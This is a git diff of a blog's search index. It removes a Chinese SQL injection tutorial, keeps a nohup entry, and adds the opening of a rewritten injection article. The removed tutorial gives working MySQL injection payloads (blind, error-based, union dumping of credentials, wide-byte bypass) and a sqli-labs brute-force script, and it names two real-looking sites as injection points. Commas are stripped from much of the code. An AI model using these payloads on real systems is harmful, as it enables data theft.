@@ -1,225 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SQL注入详解</title>
-    <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="SQl注入原因（简单描述）"><a href="#SQl注入原因（简单描述）" class="headerlink" title="SQl注入原因（简单描述）"></a>SQl注入原因（简单描述）</h1><p>SQL注入是服务器端未严格检查客户端发送的数据，而导致服务端SQL语句被恶意修改并成功执行的行为称为SQL注入 </p>
-<span id="more"></span>
-
-<p><a href="https://imgchr.com/i/sj8AYR"><img src="https://s3.ax1x.com/2021/01/26/sj8AYR.png" alt="sj8AYR.png" border="0" /></a></p>
-<p>出现原因</p>
-<ol>
-<li>代码对带入SQL语句的参数过滤不严格</li>
-<li>未启用框架的安全配置，例如：PHP的magic_quotes_gpc</li>
-<li>未使用框架的安全查询方法</li>
-<li>测试接口未删除</li>
-<li>未启用防火墙</li>
-<li>未使用其他安全防护设备</li>
-</ol>
-<p><mark>任何和数据库进行交互的地方便有可能存在注入</mark></p>
-<p>#注入点判断<br>判断是否存在注入点最常见的做法是利用单引号，即“  ”。因为当你在网页上进行查询操作的时候，在后台提交的语句实际上是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM database_name WHERE id=$id</span><br></pre></td></tr></table></figure>
-<p>所以当你查询的时候键入单引号的时候，因为单引号不匹配，则会报错。然后可以测试是否存在SQL注入点。</p>
-<ol>
-<li><p>and语句<br>在参数处输入 1 and 1&#x3D;1、1 and 1&#x3D;2。当出现前者返回页数为1的页面，而后者没有返回数据的时候，可以认为是存在注入点。当然也可以使用or语句进行测试。</p>
-</li>
-<li><p>or语句<br>在参数处输入 6 or 1 &#x3D; 1，当前者6为不存在的数字时，即假 or 真，返回页面时，存在注入点。</p>
-</li>
-<li><p>加法<br>可以在参数处输入 1 + 1，若返回的是第2个页面，则存在注入点，同时需要注意的是“+”号需要进行url的转码，转码为%2b</p>
-</li>
-<li><p>减法<br>和加法类似，在参数处输入 4-2，若返回的是第二个页面，则存在注入点。</p>
-</li>
-</ol>
-<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p>形如“<span class="exturl" data-url="aHR0cDovL3p6enovP0lEPTU1JUUyJTgwJTlEJUVGJUJDJThDJUU4JUJGJTk5JUU3JUIxJUJCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTlBJTg0JUU1JThGJTgyJUU2JTk1JUIwJUU2JTk4JUFGJUUyJTgwJTlDJUU2JTk1JUIwJUU1JUFEJTk3JUUyJTgwJTlEJUVGJUJDJThDJUU1JTlCJUEwJUU2JUFEJUE0JUU3JUE3JUIwJUU0JUI4JUJBJUUyJTgwJTlDJUU2JTk1JUIwJUU1JUFEJTk3JUU1JTlFJThCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTgyJUI5JUUyJTgwJTlEJUUzJTgwJTgyJUU2JUFEJUE0JUU3JUIxJUJCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTgyJUI5JUU2JThGJTkwJUU0JUJBJUE0JUU3JTlBJTg0U1FMJUU4JUFGJUFEJUU1JThGJUE1JUVGJUJDJThDJUU1JTg1JUI2JUU1JThFJTlGJUU1JUJEJUEyJUU1JUE0JUE3JUU4JTg3JUI0JUU0JUI4JUJBJUVGJUJDJTlBU2VsZWN0">http://zzzz?ID=55”，这类注入的参数是“数字”，因此称为“数字型注入点”。此类注入点提交的SQL语句，其原形大致为：Select<i class="fa fa-external-link-alt"></i></span> * from 表名 where 字段&#x3D;55当我们提交注入参数为“<span class="exturl" data-url="aHR0cDovL3p6enovP0lEPTU1">http://zzzz?ID=55<i class="fa fa-external-link-alt"></i></span> And[查询条件]”时，向数据库提交的完整 SQL 语句为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select * from 表名 where 字段=55 And [查询条件]</span><br></pre></td></tr></table></figure>
-
-<h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p>形如“http:&#x2F;&#x2F;****?Class&#x3D;日期”这类注入的参数是“字符”，因此称为“字符型”注入点。此类注入点提交的 SQL 语句，其原形大致为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段=’日期’</span><br></pre></td></tr></table></figure>
-<p>当我们提交注入参数为“http:&#x2F;&#x2F;****Class&#x3D;日期 And[查询条件]时，向数据库提交的完整 SQL 语句为”：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段=’日期’ and [查询条件]</span><br></pre></td></tr></table></figure>
-<p><span class="exturl" data-url="aHR0cDovL3d3dy54eWNqLmdvdi5jbi9ja3Mva3cuYXNwP2FjdGlvbj1naA==">http://www.xycj.gov.cn/cks/kw.asp?action=gh<i class="fa fa-external-link-alt"></i></span> 注入点 字母<br><span class="exturl" data-url="aHR0cDovL3d3dy56Z2Nmb3J1bS5vcmcvZm9ydW0uYXNwP3RpdGxlPSVFNCVCQyU5QSVFOCVBRSVBRSVFOCVBRSVBRSVFNyVBOCU4Qg==">http://www.zgcforum.org/forum.asp?title=会议议程<i class="fa fa-external-link-alt"></i></span> 注入点中文</p>
-<h1 id="搜索型注入点"><a href="#搜索型注入点" class="headerlink" title="搜索型注入点"></a>搜索型注入点</h1><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中<br>有“keyword&#x3D;关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。此类注入点提交的SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’。当我们提交注入参数为“keyword&#x3D;’and[查询条件] and ‘%’&#x3D;’则向数据库提交的完整SQL语句为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selct * from 表名 where 字段 like ‘%’ and [查询条件] and ‘%’=’%’</span><br></pre></td></tr></table></figure>
-
-<h1 id="POST-注入"><a href="#POST-注入" class="headerlink" title="POST 注入"></a>POST 注入</h1><p>post注入是通过对输入框进行传参，可以被带入数据库进行的查询</p>
-<p>注入的两个条件：1.用户可以控制传参，2.用户输入的语句被带入数据库进行查询</p>
-<h2 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h2><p>对输入框填入一些闭合的符号，看页面是否异常<br>例如： ’        “          )          “)</p>
-<h1 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h1><p>cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数以cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p>
-<p>成有两个必须条件，</p>
-<ol>
-<li><p>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</p>
-</li>
-<li><p>在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</p>
-</li>
-</ol>
-<h2 id="注入点判断-1"><a href="#注入点判断-1" class="headerlink" title="注入点判断"></a>注入点判断</h2><p>URL： <span class="exturl" data-url="aHR0cDovL3d3dy8/aWQ9OTk=">http://www/?id=99<i class="fa fa-external-link-alt"></i></span><br>等页面完全打开后换成<br>URL： javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“99”));<br>弹出消息框<br>将?id&#x3D;99去掉再次访问，如果和之前一样说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。现在cookie形成的一个重要因素已经明确了，接下来我们测试下能否提交特殊字符，看程序是否对数据进行过滤。</p>
-<p>正常<br>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“99 and 1&#x3D;1”));</p>
-<p>报错<br>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“99 and 1&#x3D;2”));<br>然后就是常规操作了</p>
-<h1 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h1><p>注入点在 HTTP 请求头部的某个字段中，一样是因为数据库没有对输入的请求头做过滤造成的<br>常出现在User-Agent 、 X-Forwarded-For等等</p>
-<blockquote>
-<p>根据提交方式分类后，可以发现SQL注入最长发生的位置在链接地址、数据参数、cookie信息以及HTTP请求头等位置。</p>
-</blockquote>
-<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>即可以根据返回页面判断条件真假的注入</p>
-<p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1expr2expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>
-
-<p>当然如果上面的函数被禁用，也有相应的函数替换。可百度</p>
-<p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
-<p><code>http://127.0.0.1/Less-8/?id=1and (length(database()))&gt;10 --+</code></p>
-<p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面</p>
-<p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p>
-<p>列如典型payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select 1count(*)concat(0x3a0x3a(select user())0x3a0x3afloor(rand(0)*2))a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>
-<p>count(*)计数   concat()连接字符   floor()重复数据，返回01两个值  group by 进行分组 rand(0)避免数据重复造成的错误</p>
-<p>时间型：通过页面沉睡时间判断<br>通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-9/?id=1 and (if(ascii(substr(database()11))&gt;100sleep(10)sleep(4))  --+ </span><br></pre></td></tr></table></figure>
-<p>如果当前查询的当前数据库ascii(substr(database())11)的第一个字符的ASCII码大于100，ture 沉睡10秒，FALSE 沉睡4秒</p>
-<p>sqli-labs第八关脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">for i in range(110):</span><br><span class="line">url = http://127.0.0.1/sqli-labs-master/Less-8/index.php</span><br><span class="line">payload = ?id=1 and length(database())&gt;%s %i</span><br><span class="line"># print(url+payload+%23)</span><br><span class="line">r = requests.get(url+payload+%23)</span><br><span class="line">if You are in in r.text:</span><br><span class="line">print(i)</span><br><span class="line"> </span><br><span class="line">else:</span><br><span class="line">#print(false)</span><br><span class="line">print(database_length:i)</span><br><span class="line">break</span><br><span class="line">database_len()</span><br><span class="line"> </span><br><span class="line">def database_name():</span><br><span class="line">name = </span><br><span class="line">for j in range(19):</span><br><span class="line">for i in sqcwertyuioplkjhgfdazxvbnm:</span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1 and substr(database()%d1)=%s&quot; %(ji)</span><br><span class="line"># print(url+%23)</span><br><span class="line">r = requests.get(url+%23)</span><br><span class="line">if You are in in r.text:</span><br><span class="line">name = name+i</span><br><span class="line"></span><br><span class="line">print(name)</span><br><span class="line"></span><br><span class="line">break</span><br><span class="line">print(database_name:name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
-
-<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</p>
-<p>用sqli-labs第九关讲解了<br>测试注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1 and if(1=1sleep(6)1)%23liy</span><br></pre></td></tr></table></figure>
-
-<p>利用if(条件01)函数当条件为真返回0假则返回1</p>
-<p>在这里是‘ and 1&#x3D;1 为真延时6秒假则直接返回注入点和注入语句基本确定可使用。</p>
-<p>也可以用这个，当延迟1000毫秒比较接近的时候也是存在时间盲注</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1^(select-sleep(1))^1</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = if(ascii(substr(database()11))&gt;95sleep(6)1)%23</span><br></pre></td></tr></table></figure>
-
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</p>
-<p>报错注入的十种方法</p>
-<p>报错， –+正常可能是报错注入</p>
-<h2 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h2><p>floor函数的作用是返回小于等于该值的最大整数也可以理解为向下取整，只保留整数部分<br>floor()报错注入准确地说应该是floorcountgroup by冲突报错</p>
-<p>是当这三个函数在特定情况一起使用产生的错误。</p>
-<p>首先看经典的floor注入语句:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and select 1 from (select count(*)concat(database()floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
-<p>第一眼看起来有些懵逼，我们来从最基本的入手，最后在分析这个语句</p>
-<p>首先是floor()报错产生的条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) floor(rand(0)*2)x from security.users group by x(自定义数据库的一张表)</span><br></pre></td></tr></table></figure>
-<p>这里解释一下x是什么意思，可能有些同学不太熟悉sql语句，floor(rand(0)*2)x的x是为floor(rand(0)*2)添加了一个别名，就是x就等于floor(rand(0)*2)，这样做的目的是<br>让group by 和 floor(rand(0)*2)相遇</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*)concat(user()floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
-
-<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue() :对XML文档进行查询的函数</p>
-<p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样</p>
-<p>语法：extractvalue(目标xml文档，xml路径)</p>
-<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
-<p>正常查询 第二个参数的位置格式 为 &#x2F;xxx&#x2F;xx&#x2F;xx&#x2F;xx 即使查询不到也不会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1concat(0x7e(select user())0x7e)));</span><br></pre></td></tr></table></figure>
-
-<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。</p>
-<p>语法updatexml(目标xml文档，xml路径，更新的内容)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username from security.user where id=1 and (updatexml(‘anything’’/xx/xx’’anything’))</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (updatexml(1concat(0x7e(select user())0x7e)1));</span><br></pre></td></tr></table></figure>
-
-<h2 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h2><ol>
-<li>函数解释<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制，但下面介绍的GeometryCollection的子类会限制其成员。这类限制可能基于：</li>
-</ol>
-<p>元素类型（例如，MultiPoint可能仅包含Point元素）。</p>
-<p>维数</p>
-<p>对元素间空间交迭程度的限制</p>
-<p>官方文档中举例的用法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GEOMETRYCOLLECTION(POINT(10 10) POINT(30 30) LINESTRING(15 15 20 20))</span><br></pre></td></tr></table></figure>
-<p>POINT(xy) 函数这是坐标函数，相当于XY坐标图上的一点。</p>
-<p>LINESTRING(x yx y)函数这个函数用来描述直线两点连成的直线。</p>
-<ol start="2">
-<li><p>报错原理<br>由于MYSQL无法用这样字符串画出图形所以报错了</p>
-</li>
-<li><p>约束条件<br><code>5.5&lt;mysql版本&lt;5.6</code></p>
-</li>
-<li><p>注入代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and geometrycollection((select * from(select * from (操作代码)a)b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
-<h2 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
-<h2 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
-
-<h2 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
-<h2 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p>exp是以e为底的指数函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(1);</span><br><span class="line">+-------------------+</span><br><span class="line">| exp(1)            |</span><br><span class="line">+-------------------+</span><br><span class="line">| 2.718281828459045 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in exp(710)</span><br></pre></td></tr></table></figure>
-<p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select ~(select version());</span><br><span class="line">+----------------------+</span><br><span class="line">| ~(select version())  |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551610 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from(select database())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))</span><br></pre></td></tr></table></figure>
-
-<p>在脚本语言中，就会将错误中的一些表达式转化成相应的字符串，即像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DOUBLE value is out of range in exp(~((select error_based_hpf from dual)))</span><br></pre></td></tr></table></figure>
-<p>利用例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
-
-<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p>可以使用union的情况下的注入</p>
-<p>判断字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 1 --+</span><br></pre></td></tr></table></figure>
-<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断</p>
-<p>判断回显点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select 123 limit 11 --+</span><br><span class="line">id=-1 union select 123 --+</span><br><span class="line">id=-1 union select 123%20 --+</span><br></pre></td></tr></table></figure>
-
-<p>爆库名<br>可能判断的时候特殊情况还得留个心眼，但是下面就没啥好说的了，基本都是常规操作了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1database()3 --+</span><br></pre></td></tr></table></figure>
-
-<p>爆表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1group_concat(table_name)3 from information_schema.tables where table_schema=security --+</span><br></pre></td></tr></table></figure>
-
-<p>爆字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1group_concat(column_name)3 from information_schema.columns where table_schema=security and table_name=users --+</span><br></pre></td></tr></table></figure>
-
-<p>查数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1group_concat(username0x5cpassword)3 from security.users --+</span><br></pre></td></tr></table></figure>
-
-<h1 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h1><p>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure>
-<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>利用gbk是多字节的编码，两个字节代表一个汉字</p>
-<ol>
-<li>宽字节注入原理：<br>GBK 占用两字节</li>
-</ol>
-<p>ASCII占用一字节</p>
-<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p>
-<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p>
-<p>当提交</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=1%23</span><br></pre></td></tr></table></figure>
-<p>时，MySQL的运行的SQL语句为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where  id =1\ and 1=1#</span><br></pre></td></tr></table></figure>
-<p>很明显这是没有注入成功的，而当我们提交</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1%df and 1=1%23</span><br></pre></td></tr></table></figure>
-<p>MySQL的运行的SQL语句为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id =1運 and 1=1#</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>注入点判断<br>吧?id&#x3D;1 –&gt; ?id&#x3D;%df%27看回显是否有汉字</li>
-</ol>
-<p>然后都是常规操作了</p>
-<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a>group_concat的使用</h1><p><font color="red">mysql版本&gt;5.0切使用了information_schema数据库</font><br>爆所有数据名 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from (information_schema.schemata )</span><br></pre></td></tr></table></figure>
-
-<p>得到当前库的所有表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name)from(information_schema.tables)where table_schema=database()</span><br></pre></td></tr></table></figure>
-
-<p>得到表中的字段名 将敏感的表进行16进制编码adminuser&#x3D;0x61646D696E75736572</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(column_name) from (information_schema.columns) where table_name=0x61646D696E75736572</span><br></pre></td></tr></table></figure>
-
-<p>得到字段具体的值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(username0x3apassword) from (adminuser)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure>
-
-<p>version() –&gt;查看版本<br>@@datadir –&gt;读数据库路径<br>user()    –&gt;当前账户<br>database()–&gt;当前数据库<br>into outfile–&gt;一句话用的</p>
-<p>注释</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- -</span><br><span class="line">-- +</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>网络安全注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>nohup命令</title>
     <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
@@ -243,6 +24,208 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入详解</title>
+    <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="SQL注入详解2-0-重构篇"><a href="#SQL注入详解2-0-重构篇" class="headerlink" title="SQL注入详解2.0-重构篇"></a>SQL注入详解2.0-重构篇</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>之前写过一篇，但是愈发感觉到之前写的薄弱和乱，所以重构！</p>
+</blockquote>
+<p><a href="https://sm.ms/image/ecEnPtXKhJqdw1B" target="_blank"><img src="https://s2.loli.net/2022/02/24/ecEnPtXKhJqdw1B.jpg" ></a></p>
+<span id="more"></span>
+
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>实际上注入类漏洞最<strong>本质的原因就是</strong>，<code>混洗了代码和数据的边界</code>。</p>
+<p><a href="https://sm.ms/image/bP659ZCEGdpOSFm" target="_blank"><img src="https://s2.loli.net/2022/02/24/bP659ZCEGdpOSFm.png" ></a></p>
+<ul>
+<li>注入的类型总的就只有3种：<ul>
+<li>联合注入<ul>
+<li>联合注入从类型来划分又有：<ol>
+<li>数字型</li>
+<li>字符型</li>
+</ol>
+</li>
+<li>联合注入从注入点来划分又有：<ol>
+<li>搜索框注入</li>
+<li>HTTP头注入<ol>
+<li>User-Agent注入</li>
+<li>X-Forwarded-For注入</li>
+<li>Cookie注入</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li>报错注入</li>
+<li>盲注<ul>
+<li>盲注从方式来划分有：<ul>
+<li>时间盲注</li>
+<li>布尔盲注</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>由<strong>union select</strong>得名，是一种最快的查询方式。</p>
